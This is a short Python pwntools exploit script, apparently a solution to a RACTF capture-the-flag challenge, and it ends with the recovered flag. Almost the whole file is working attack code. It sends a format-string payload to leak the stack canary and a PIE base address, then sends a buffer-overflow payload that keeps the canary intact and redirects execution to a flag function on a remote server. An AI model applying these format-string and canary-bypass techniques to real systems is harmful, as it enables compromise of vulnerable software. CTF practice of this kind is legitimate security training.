
from pwn import *

# p = process('./fiap')
p = remote('88.198.219.20', 52692)

p.recvuntil('name?\n')
p.sendline('%11$p %3$p')
w = p.recvuntil('cake?').split()

Canary = int(w[2], 16)
Binary = int(w[3][:-1], 16) - 0x128f
flag = 0x00001209 + Binary

print()
log.info('Canary : ' + hex(Canary))
log.info('Binary : ' + hex(Binary))
print()

p.sendline((p32(Canary) + b'\x00')*6 + b'A' * 11 + p32(flag))

print('\nFlag : ' + p.recvall().strip().decode() + '\n')

# Flag : ractf{B4k1ng_4_p1E!}

